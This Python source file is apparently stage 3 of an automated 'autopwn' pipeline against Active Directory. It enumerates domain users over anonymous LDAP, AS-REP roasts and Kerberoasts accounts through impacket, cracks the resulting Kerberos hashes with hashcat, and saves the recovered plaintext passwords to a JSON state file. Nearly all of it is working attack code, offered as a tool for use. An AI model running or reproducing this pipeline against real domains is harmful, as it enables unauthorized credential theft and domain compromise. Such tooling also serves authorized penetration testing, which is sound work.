"""
Stage 3: Active Directory Enumeration
Reads:  state/services.json
Writes: state/ad_findings.json

Performs:
  - LDAP anonymous bind  (ldap3)
  - AS-REP Roasting      (impacket, no credentials required)
  - Kerberoasting        (impacket, only when credentials are available)
  - Offline hash cracking (hashcat subprocess)
"""

from __future__ import annotations

import json
import os
import pathlib
import re
import socket
import struct
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from typing import Optional

# ---------------------------------------------------------------------------
# ldap3 import (required; installed: ldap3 2.9.1)
# ---------------------------------------------------------------------------
try:
    from ldap3 import (
        ALL,
        ANONYMOUS,
        SUBTREE,
        Connection,
        Server,
    )
    from ldap3.core.exceptions import LDAPException
    LDAP3_AVAILABLE = True
except ImportError:
    LDAP3_AVAILABLE = False
    print("[ad_enum] WARNING: ldap3 not installed — LDAP enumeration disabled.")

# ---------------------------------------------------------------------------
# impacket import (optional in dev; required on Kali target)
# ---------------------------------------------------------------------------
try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP, AS_REQ, TGS_REP
    from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
    from impacket.krb5.types import KerberosTime, Principal
    from impacket.krb5.kerberosv5 import KerberosError
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print("[ad_enum] WARNING: impacket not installed — Kerberos attacks disabled.")

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR      = pathlib.Path(__file__).resolve().parent.parent
STATE_DIR     = BASE_DIR / "state"
WORDLIST_DIR  = BASE_DIR / "wordlists"
SERVICES_JSON = STATE_DIR / "services.json"
OUTPUT_JSON   = STATE_DIR / "ad_findings.json"
SSH_WORDLIST  = WORDLIST_DIR / "ssh_passwords.txt"

# hashcat hash-mode constants
HASHCAT_ASREP      = 18200   # $krb5asrep$23$...
HASHCAT_KERBEROAST = 13100   # $krb5tgs$23$...

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[ad_enum {ts}] {msg}", flush=True)


def _atomic_write(path: pathlib.Path, data: dict) -> None:
    """Write JSON atomically: write to .tmp then rename."""
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=2))
    tmp.rename(path)


def _load_json(path: pathlib.Path) -> Optional[dict]:
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text())
    except (json.JSONDecodeError, OSError) as exc:
        _log(f"WARNING: could not read {path}: {exc}")
        return None


def _open_ports(host_record: dict) -> set[int]:
    return {
        p["port"]
        for p in host_record.get("ports", [])
        if p.get("state") == "open"
    }


def _port_open(host_record: dict, port: int) -> bool:
    return port in _open_ports(host_record)


def _ldap_port(host_record: dict) -> Optional[int]:
    """Return the actual open LDAP port (389 or any non-standard mapping like 1389)."""
    for p in host_record.get("ports", []):
        if p.get("state") == "open" and p.get("service", "") in ("ldap", ""):
            port_num = p.get("port")
            if port_num in (389,) or (p.get("service") == "ldap"):
                return port_num
    # Fallback: any open port that has ldap in service name
    for p in host_record.get("ports", []):
        if p.get("state") == "open" and "ldap" in p.get("service", "").lower():
            return p.get("port")
    return None


# ---------------------------------------------------------------------------
# Domain name extraction
# ---------------------------------------------------------------------------

def _extract_domain_from_nse(host_record: dict) -> Optional[str]:
    """
    Parse ldap-rootdse NSE output for namingContexts, e.g.:
        "namingContexts: DC=neutron,DC=local"
    Returns lowercase dot-notation domain like "neutron.local".
    """
    for port_entry in host_record.get("ports", []):
        nse = port_entry.get("nse_results", {})
        rootdse = nse.get("ldap-rootdse", "")
        if not rootdse:
            continue
        # Match DC= components from the FIRST namingContexts entry only
        nc_match = re.search(r"DC=[^,\s]+(?:,DC=[^,\s]+)*", rootdse, re.IGNORECASE)
        if nc_match:
            parts = re.findall(r"DC=([^,\s]+)", nc_match.group(0), re.IGNORECASE)
            if parts:
                return ".".join(parts).lower()
    return None


def _guess_domain_from_hostname(hostname: str) -> Optional[str]:
    """
    Given 'dc01.neutron.local', return 'neutron.local'.
    Given 'dc01', return None.
    """
    if not hostname:
        return None
    parts = hostname.strip().split(".")
    if len(parts) >= 3:
        # hostname.domain.tld — drop first label
        return ".".join(parts[1:]).lower()
    if len(parts) == 2:
        # domain.tld with no host prefix — treat whole thing as domain
        return hostname.lower()
    return None


def _derive_domain(host_record: dict) -> Optional[str]:
    domain = _extract_domain_from_nse(host_record)
    if domain:
        return domain
    return _guess_domain_from_hostname(host_record.get("hostname", ""))


# ---------------------------------------------------------------------------
# Stage A: LDAP anonymous bind
# ---------------------------------------------------------------------------

def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
    """
    Attempt anonymous LDAP bind and enumerate user objects.

    Returns:
        {
            "success": bool,
            "users": [sAMAccountName, ...],
            "error": str | None,
        }
    """
    result = {"success": False, "users": [], "error": None}

    if not LDAP3_AVAILABLE:
        result["error"] = "ldap3 not available"
        return result

    # Build the base DN from domain (neutron.local -> DC=neutron,DC=local)
    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    _log(f"  LDAP anonymous bind -> {dc_ip}:{port}  base_dn={base_dn}")

    try:
        server = Server(dc_ip, port=port, get_info=ALL, connect_timeout=10)
        conn = Connection(
            server,
            authentication=ANONYMOUS,
            auto_bind=True,
            receive_timeout=15,
        )
    except LDAPException as exc:
        result["error"] = f"LDAP bind failed: {exc}"
        _log(f"  LDAP bind error: {exc}")
        return result
    except Exception as exc:
        result["error"] = f"Connection error: {exc}"
        _log(f"  LDAP connection error: {exc}")
        return result

    # Try AD filter first, fall back to RFC-2307/OpenLDAP filter
    search_attempts = [
        ("(objectClass=user)",          ["sAMAccountName", "userPrincipalName", "memberOf", "userAccountControl"]),
        ("(objectClass=inetOrgPerson)", ["uid", "cn", "mail"]),
    ]

    entries = []
    used_attrs: list[str] = []
    for search_filter, attrs in search_attempts:
        try:
            ok = conn.search(
                base_dn,
                search_filter,
                search_scope=SUBTREE,
                attributes=attrs,
                time_limit=30,
                size_limit=500,
            )
        except LDAPException as exc:
            _log(f"  LDAP search error ({search_filter}): {exc}")
            continue
        if ok and conn.entries:
            entries = conn.entries
            used_attrs = attrs
            _log(f"  LDAP search matched using filter {search_filter}")
            break

    if not entries:
        result["error"] = "LDAP search returned no results (anonymous bind may be restricted)"
        _log("  LDAP search returned no results")
        conn.unbind()
        return result

    users = []
    for entry in entries:
        username = None
        # AD path
        try:
            username = str(entry.sAMAccountName.value) if entry.sAMAccountName else None
        except Exception:
            pass
        # OpenLDAP path
        if not username:
            try:
                username = str(entry.uid.value) if entry.uid else None
            except Exception:
                pass
        if username and username.strip() and username.strip().lower() not in ("", "$"):
            users.append(username.strip())

    conn.unbind()

    result["success"] = True
    result["users"] = users
    _log(f"  LDAP enumeration: found {len(users)} user accounts")
    return result


# ---------------------------------------------------------------------------
# Stage B: AS-REP Roasting (impacket)
# ---------------------------------------------------------------------------

def _format_asrep_hash(username: str, domain: str, as_rep_obj) -> str:
    """
    Extract the AS-REP encrypted part and format as hashcat -m 18200:
        $krb5asrep$23$user@DOMAIN:checksum$ciphertext
    Follows the same logic as impacket's GetNPUsers.py output.
    """
    # The enc-part is in as_rep_obj['enc-part']
    enc_part = as_rep_obj["enc-part"]
    # etype 23 = RC4-HMAC
    cipher_text = bytes(enc_part["cipher"])
    # First 16 bytes = checksum, rest = ciphertext
    checksum = cipher_text[:16].hex()
    ctext    = cipher_text[16:].hex()
    return f"$krb5asrep$23${username}@{domain.upper()}:{checksum}${ctext}"


def asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[str]:
    """
    Attempt AS-REP roasting against every user in the list.
    Returns a list of hashcat-format hashes for users with pre-auth disabled.

    Implementation note:
        The impacket Python API (getKerberosTGT) does not expose the raw
        AS-REP PDU needed to format $krb5asrep$23$ hashes.  This function
        delegates entirely to asrep_roast_subprocess() which calls
        GetNPUsers.py — the standard Kali tool that handles hash formatting
        correctly.  The Python API path is retained only as a fallback to
        identify roastable users via error codes when GetNPUsers.py is
        not available.
    """
    hashes: list[str] = []

    if not users:
        _log("  AS-REP roast skipped: no users to test")
        return hashes

    _log(f"  AS-REP roasting {len(users)} users against {dc_ip} (domain={domain})")

    # ---- Primary path: subprocess via GetNPUsers.py (reliable) ----
    hashes = asrep_roast_subprocess(dc_ip, domain, users)
    if hashes:
        return hashes

    # ---- Fallback: use impacket API to identify roastable users ----
    # This won't produce formatted hashes, but logs which users have
    # pre-auth disabled so the operator knows what to target manually.
    if not IMPACKET_AVAILABLE:
        _log("  AS-REP roast: neither GetNPUsers.py nor impacket available")
        return hashes

    domain_upper = domain.upper()
    roastable_users: list[str] = []

    for username in users:
        try:
            client_name = Principal(
                username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            # If getKerberosTGT succeeds with empty password, pre-auth is disabled
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                clientName=client_name,
                password="",
                domain=domain_upper,
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=dc_ip,
                requestPAC=False,
            )
            # Success = pre-auth NOT required — user is roastable
            roastable_users.append(username)
            _log(f"    [!] {username}: pre-auth NOT required (AS-REP roastable)")

        except Exception as exc:
            exc_str = str(exc)
            if "KDC_ERR_PREAUTH_REQUIRED" in exc_str or "25" in exc_str:
                continue  # Normal — user has pre-auth enabled
            if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in exc_str or "6" in exc_str:
                continue  # User does not exist in the domain
            if "KDC_ERR_CLIENT_REVOKED" in exc_str or "18" in exc_str:
                _log(f"    {username}: account disabled/locked — skipping")
                continue
            # Unexpected error — log but continue
            _log(f"    {username}: unexpected Kerberos error: {exc_str[:120]}")
            continue

    if roastable_users:
        _log(
            f"  AS-REP roast: {len(roastable_users)} roastable user(s) identified "
            f"via API but hash formatting requires GetNPUsers.py (not found on PATH)"
        )

    _log(f"  AS-REP roast complete: {len(hashes)} hashes recovered")
    return hashes


def asrep_roast_subprocess(dc_ip: str, domain: str, users: list[str]) -> list[str]:
    """
    Fallback AS-REP roaster: call impacket's GetNPUsers.py script directly
    if it is available on PATH (standard on Kali).  Returns hashcat hashes.
    """
    hashes: list[str] = []

    get_np = _find_impacket_script("GetNPUsers.py")
    if not get_np:
        _log("  GetNPUsers.py not found on PATH or impacket examples dir — skipping AS-REP subprocess")
        return hashes

    _log(f"  AS-REP roast (subprocess) -> GetNPUsers.py against {dc_ip}")

    # Write users to a temp file
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", prefix="autopwn_users_", delete=False
    ) as uf:
        uf.write("\n".join(users))
        users_file = uf.name

    out_file = f"/tmp/autopwn_asrep_{dc_ip.replace('.', '_')}.txt"

    cmd = [
        "python3", get_np,
        f"{domain}/",
        "-dc-ip", dc_ip,
        "-usersfile", users_file,
        "-format", "hashcat",
        "-outputfile", out_file,
        "-no-pass",
    ]

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
        )
        _log(f"  GetNPUsers.py exit={proc.returncode}")
        if proc.stdout:
            _log(f"  stdout: {proc.stdout[:300]}")
    except subprocess.TimeoutExpired:
        _log("  GetNPUsers.py timed out after 60 s")
    except FileNotFoundError as exc:
        _log(f"  GetNPUsers.py execution error: {exc}")
    finally:
        try:
            os.unlink(users_file)
        except OSError:
            pass

    # Parse output file
    if os.path.exists(out_file):
        for line in pathlib.Path(out_file).read_text().splitlines():
            line = line.strip()
            if line.startswith("$krb5asrep$"):
                hashes.append(line)
        try:
            os.unlink(out_file)
        except OSError:
            pass

    _log(f"  AS-REP roast (subprocess): {len(hashes)} hashes recovered")
    return hashes


# ---------------------------------------------------------------------------
# Stage C: Kerberoasting (impacket)
# ---------------------------------------------------------------------------

def kerberoast(dc_ip: str, domain: str, credentials: list[dict]) -> list[str]:
    """
    Kerberoast using first available valid credential.
    credentials: list of {"username": ..., "password": ..., "domain": ...}
    Returns list of hashcat -m 13100 format hashes.
    """
    hashes: list[str] = []

    if not credentials:
        _log("  Kerberoast skipped: no credentials available")
        return hashes

    # Try subprocess path first (more reliable across impacket versions)
    get_spns = _find_impacket_script("GetUserSPNs.py")
    if get_spns:
        hashes = kerberoast_subprocess(dc_ip, domain, credentials, get_spns)
        if hashes:
            return hashes

    if not IMPACKET_AVAILABLE:
        _log("  Kerberoast skipped: impacket not available")
        return hashes

    domain_upper = domain.upper()

    for cred in credentials:
        cred_domain = cred.get("domain", domain)
        username    = cred.get("username", "")
        password    = cred.get("password", "")

        if not username or not password:
            continue

        _log(f"  Kerberoast using {username}@{cred_domain} against {dc_ip}")
        try:
            client_name = Principal(
                username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                clientName=client_name,
                password=password,
                domain=domain_upper,
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=dc_ip,
            )
        except Exception as exc:
            _log(f"  TGT request failed for {username}: {exc}")
            continue

        # Enumerate SPNs via LDAP then request TGS for each
        _log("  TGT obtained; enumerating SPNs via LDAP for Kerberoasting")
        spn_users = _get_spn_users(dc_ip, domain)
        if not spn_users:
            _log("  No SPN accounts found")
            break

        for spn, spn_username in spn_users:
            try:
                server_name = Principal(
                    spn,
                    type=constants.PrincipalNameType.NT_SRV_INST.value,
                )
                tgs, cipher_tgs, old_sk, sk = getKerberosTGS(
                    serverName=server_name,
                    domain=domain_upper,
                    kdcHost=dc_ip,
                    tgt=tgt,
                    cipher=cipher,
                    sessionKey=session_key,
                )
                # Format as hashcat $krb5tgs$23$
                tgs_hash = _format_tgs_hash(spn_username, spn, domain_upper, tgs)
                hashes.append(tgs_hash)
                _log(f"  Kerberoast: TGS obtained for SPN {spn}")
            except Exception as exc:
                _log(f"  TGS request failed for {spn}: {str(exc)[:100]}")
                continue

        break  # succeeded with first valid cred — no need to retry

    _log(f"  Kerberoast complete: {len(hashes)} TGS hashes recovered")
    return hashes


def kerberoast_subprocess(
    dc_ip: str,
    domain: str,
    credentials: list[dict],
    script_path: str,
) -> list[str]:
    """Call GetUserSPNs.py via subprocess (Kali standard path)."""
    hashes: list[str] = []
    if not credentials:
        return hashes

    cred    = credentials[0]
    username = cred.get("username", "")
    password = cred.get("password", "")
    if not username or not password:
        return hashes

    out_file = f"/tmp/autopwn_tgs_{dc_ip.replace('.', '_')}.txt"
    cmd = [
        "python3", script_path,
        f"{domain}/{username}:{password}",
        "-dc-ip", dc_ip,
        "-outputfile", out_file,
        "-request",
    ]

    _log(f"  Kerberoast (subprocess) -> GetUserSPNs.py as {username}@{domain}")
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
        )
        _log(f"  GetUserSPNs.py exit={proc.returncode}")
    except subprocess.TimeoutExpired:
        _log("  GetUserSPNs.py timed out after 60 s")
        return hashes
    except FileNotFoundError as exc:
        _log(f"  GetUserSPNs.py execution error: {exc}")
        return hashes

    if os.path.exists(out_file):
        for line in pathlib.Path(out_file).read_text().splitlines():
            line = line.strip()
            if line.startswith("$krb5tgs$"):
                hashes.append(line)
        try:
            os.unlink(out_file)
        except OSError:
            pass

    _log(f"  Kerberoast (subprocess): {len(hashes)} TGS hashes recovered")
    return hashes


def _get_spn_users(dc_ip: str, domain: str) -> list[tuple[str, str]]:
    """
    Query LDAP for user accounts with servicePrincipalName set.
    Returns list of (spn_string, sAMAccountName) tuples.
    """
    if not LDAP3_AVAILABLE:
        return []

    spn_users: list[tuple[str, str]] = []
    base_dn = ",".join(f"DC={part}" for part in domain.split("."))

    try:
        server = Server(dc_ip, port=389, get_info=ALL, connect_timeout=10)
        conn   = Connection(server, authentication=ANONYMOUS, auto_bind=True, receive_timeout=15)
        conn.search(
            base_dn,
            "(&(objectClass=user)(servicePrincipalName=*))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "servicePrincipalName"],
            time_limit=20,
        )
        for entry in conn.entries:
            sam  = str(entry.sAMAccountName.value) if entry.sAMAccountName else ""
            spns = entry.servicePrincipalName.values if entry.servicePrincipalName else []
            for spn in spns:
                spn_users.append((str(spn), sam))
        conn.unbind()
    except Exception as exc:
        _log(f"  SPN LDAP query failed: {exc}")

    return spn_users


def _format_tgs_hash(username: str, spn: str, domain: str, tgs_data: bytes) -> str:
    """
    Format a TGS blob as hashcat -m 13100 ($krb5tgs$23$).
    tgs_data is the raw EncTicket bytes from getKerberosTGS.
    """
    # Minimal formatting — first 16 bytes checksum, rest ciphertext
    checksum = tgs_data[:16].hex()
    ctext    = tgs_data[16:].hex()
    return f"$krb5tgs$23$*{username}${domain}${spn}*${checksum}${ctext}"


# ---------------------------------------------------------------------------
# Stage D: Offline hash cracking (hashcat)
# ---------------------------------------------------------------------------

def crack_hashes(hashes: list[str], wordlist_path: pathlib.Path) -> list[dict]:
    """
    Run hashcat against the provided hashes with the given wordlist.
    Returns list of {"hash": ..., "plaintext": ..., "username": ..., "domain": ...}.

    Continues (with a warning) if hashcat is not installed or exits non-zero.
    Hashes are preserved in /tmp for manual cracking if hashcat fails.
    """
    cracked: list[dict] = []

    if not hashes:
        return cracked

    if not wordlist_path.exists():
        _log(f"  Wordlist not found at {wordlist_path} — skipping offline cracking")
        return cracked

    # Separate AS-REP and TGS hashes
    asrep_hashes = [h for h in hashes if h.startswith("$krb5asrep$")]
    tgs_hashes   = [h for h in hashes if h.startswith("$krb5tgs$")]

    def _run_hashcat(hash_list: list[str], mode: int, label: str) -> list[dict]:
        results: list[dict] = []
        if not hash_list:
            return results

        hash_file    = f"/tmp/autopwn_hashes_{mode}.txt"
        cracked_file = f"/tmp/autopwn_cracked_{mode}.txt"

        pathlib.Path(hash_file).write_text("\n".join(hash_list) + "\n")
        # Remove stale pot/output file so results are fresh
        for f in [cracked_file]:
            try:
                os.unlink(f)
            except OSError:
                pass

        cmd = [
            "hashcat",
            f"-m", str(mode),
            hash_file,
            str(wordlist_path),
            "--quiet",
            "--force",           # needed on VMs without GPU
            "-o", cracked_file,
            "--outfile-format", "2",   # hash:plain
        ]

        _log(f"  hashcat -m {mode} ({label}): {len(hash_list)} hashes, wordlist={wordlist_path.name}")
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
            )
            # hashcat exit codes: 0=cracked, 1=exhausted, 2=runtime error, 3=usage error
            _log(f"  hashcat exit={proc.returncode}")
            if proc.returncode not in (0, 1):
                _log(f"  hashcat stderr: {proc.stderr[:300]}")
        except FileNotFoundError:
            _log("  hashcat not found on PATH — hashes saved to /tmp for manual cracking")
            return results
        except subprocess.TimeoutExpired:
            _log("  hashcat timed out after 120 s — partial results may exist")

        # Parse cracked output (format: hash:plaintext — split on LAST colon)
        cracked_path = pathlib.Path(cracked_file)
        if cracked_path.exists():
            for line in cracked_path.read_text().splitlines():
                line = line.strip()
                if not line:
                    continue
                # Split on the LAST ':' to isolate plaintext from hash
                sep_idx = line.rfind(":")
                if sep_idx == -1:
                    continue
                h_part     = line[:sep_idx]
                plain_text = line[sep_idx + 1:]

                # Extract username and domain from hash string
                username, domain = _parse_hash_identity(h_part)
                results.append({
                    "hash":      h_part,
                    "plaintext": plain_text,
                    "username":  username,
                    "domain":    domain,
                })
                _log(f"  CRACKED [{label}]: {username}@{domain} -> {plain_text}")

        return results

    cracked_records  = _run_hashcat(asrep_hashes, HASHCAT_ASREP,      "AS-REP")
    cracked_records += _run_hashcat(tgs_hashes,   HASHCAT_KERBEROAST, "Kerberoast")
    return cracked_records


def _parse_hash_identity(hash_str: str) -> tuple[str, str]:
    """
    Extract (username, domain) from a hashcat hash string.
    Handles:
      $krb5asrep$23$user@DOMAIN.LOCAL:...
      $krb5tgs$23$*user$DOMAIN.LOCAL$spn*$...
    """
    # AS-REP: $krb5asrep$23$user@DOMAIN:...
    m = re.search(r"\$krb5asrep\$23\$([^@]+)@([^:]+):", hash_str, re.IGNORECASE)
    if m:
        return m.group(1), m.group(2).lower()

    # TGS: $krb5tgs$23$*user$DOMAIN$spn*$...
    m = re.search(r"\$krb5tgs\$23\$\*([^\$]+)\$([^\$]+)\$", hash_str, re.IGNORECASE)
    if m:
        return m.group(1), m.group(2).lower()

    return "unknown", "unknown"


# ---------------------------------------------------------------------------
# Credential loading helpers
# ---------------------------------------------------------------------------

def _load_existing_credentials() -> list[dict]:
    """
    Pull any credentials already recovered in previous pipeline stages.
    Checks:
      - state/exploitation.json  (credentials_recovered fields)
      - state/ad_findings.json   (cracked_credentials — from prior run)
    """
    creds: list[dict] = []

    for json_path in [
        STATE_DIR / "exploitation.json",
        STATE_DIR / "ad_findings.json",
    ]:
        data = _load_json(json_path)
        if not data:
            continue

        # exploitation.json: list of result dicts, each may have credentials_recovered
        if isinstance(data, dict) and "results" in data:
            for result in data.get("results", []):
                for c in result.get("credentials_recovered", []):
                    if c not in creds:
                        creds.append(c)

        # ad_findings.json: top-level cracked_credentials list
        if isinstance(data, dict) and "cracked_credentials" in data:
            for c in data["cracked_credentials"]:
                if c not in creds:
                    creds.append(c)

    return creds


# ---------------------------------------------------------------------------
# Impacket script locator
# ---------------------------------------------------------------------------

def _find_impacket_script(script_name: str) -> Optional[str]:
    """
    Search common Kali locations for an impacket example script.
    Returns the full path string, or None if not found.
    """
    search_paths = [
        f"/usr/bin/{script_name}",
        f"/usr/local/bin/{script_name}",
        f"/usr/share/doc/python3-impacket/examples/{script_name}",
        f"/usr/lib/python3/dist-packages/impacket/examples/{script_name}",
    ]

    # Also check PATH via 'which'
    try:
        result = subprocess.run(
            ["which", script_name],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    for path in search_paths:
        if os.path.isfile(path):
            return path

    return None


# ---------------------------------------------------------------------------
# Main run() function
# ---------------------------------------------------------------------------

def run() -> dict:
    """
    Entry point for Stage 3.
    Reads state/services.json, enumerates all domain controllers,
    writes state/ad_findings.json, and returns the findings dict.
    """
    _log("Stage 3: Active Directory Enumeration starting")

    services_data = _load_json(SERVICES_JSON)
    if not services_data:
        _log("ERROR: state/services.json not found — run Stage 2 first")
        sys.exit(1)

    hosts = services_data.get("hosts", [])

    # Identify domain controllers
    dc_hosts = [
        h for h in hosts
        if h.get("flags", {}).get("is_domain_controller", False)
    ]

    if not dc_hosts:
        _log("No domain controllers found in services.json — writing empty result")
        empty_result = {
            "domain": None,
            "dc_ip": None,
            "users": [],
            "asrep_hashes": [],
            "kerberoast_hashes": [],
            "cracked_credentials": [],
        }
        _atomic_write(OUTPUT_JSON, empty_result)
        return empty_result

    _log(f"Found {len(dc_hosts)} domain controller(s): {[h['ip'] for h in dc_hosts]}")

    # Load any credentials from earlier stages (for Kerberoasting)
    existing_creds = _load_existing_credentials()
    if existing_creds:
        _log(f"Found {len(existing_creds)} credential(s) from earlier stages")

    # Aggregate results across all DCs (in practice usually one primary DC)
    all_users:             list[str]  = []
    all_asrep_hashes:      list[str]  = []
    all_kerberoast_hashes: list[str]  = []
    primary_domain:        str        = "unknown"
    primary_dc_ip:         str        = dc_hosts[0]["ip"]

    for dc in dc_hosts:
        dc_ip = dc["ip"]
        _log(f"\n--- Processing DC: {dc_ip} ({dc.get('hostname', 'unknown')}) ---")

        # Derive domain name
        domain = _derive_domain(dc)
        if not domain:
            _log(f"  Could not determine domain for {dc_ip} — skipping")
            continue

        _log(f"  Domain: {domain}")
        if primary_domain == "unknown":
            primary_domain = domain
            primary_dc_ip  = dc_ip

        # --- A: LDAP anonymous bind ---
        ldap_port = _ldap_port(dc)
        if ldap_port is not None:
            ldap_result = ldap_anonymous_enum(dc_ip, domain, port=ldap_port)
            if ldap_result["success"]:
                for u in ldap_result["users"]:
                    if u not in all_users:
                        all_users.append(u)
            else:
                _log(f"  LDAP enum failed: {ldap_result.get('error')}")
        else:
            _log("  Port 389 not open — skipping LDAP enumeration")

        # --- B: AS-REP Roasting (no credentials needed, port 88 required) ---
        if _port_open(dc, 88):
            if all_users:
                asrep_hashes = asrep_roast(dc_ip, domain, all_users)
                all_asrep_hashes.extend(h for h in asrep_hashes if h not in all_asrep_hashes)
            else:
                _log("  No users enumerated — skipping AS-REP roast")
        else:
            _log("  Port 88 not open — skipping AS-REP roast")

        # --- C: Kerberoasting (credentials required) ---
        if _port_open(dc, 88) or _ldap_port(dc) is not None:
            # Merge domain credentials that match this domain (or are generic)
            domain_creds = [
                c for c in existing_creds
                if c.get("domain", "").lower() in (domain.lower(), "", "unknown")
            ]
            if domain_creds:
                tgs_hashes = kerberoast(dc_ip, domain, domain_creds)
                all_kerberoast_hashes.extend(
                    h for h in tgs_hashes if h not in all_kerberoast_hashes
                )
            else:
                _log("  No domain credentials available — skipping Kerberoast")
        else:
            _log("  Neither port 88 nor 389 open — skipping Kerberoast")

    # --- D: Offline hash cracking ---
    all_hashes = all_asrep_hashes + all_kerberoast_hashes
    cracked_records: list[dict] = []

    if all_hashes:
        _log(f"\n--- Offline cracking: {len(all_hashes)} total hashes ---")
        raw_cracked = crack_hashes(all_hashes, SSH_WORDLIST)
        for record in raw_cracked:
            cracked_records.append({
                "username": record["username"],
                "password": record["plaintext"],
                "domain":   record["domain"],
            })
    else:
        _log("\nNo hashes to crack")

    # Build and write final result
    result = {
        "domain":               primary_domain,
        "dc_ip":                primary_dc_ip,
        "users":                all_users,
        "asrep_hashes":         all_asrep_hashes,
        "kerberoast_hashes":    all_kerberoast_hashes,
        "cracked_credentials":  cracked_records,
    }

    _atomic_write(OUTPUT_JSON, result)
    _log(f"\nStage 3 complete. Results written to {OUTPUT_JSON}")
    _log(
        f"Summary: domain={primary_domain}, users={len(all_users)}, "
        f"AS-REP hashes={len(all_asrep_hashes)}, "
        f"TGS hashes={len(all_kerberoast_hashes)}, "
        f"cracked={len(cracked_records)}"
    )

    return result


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    run()
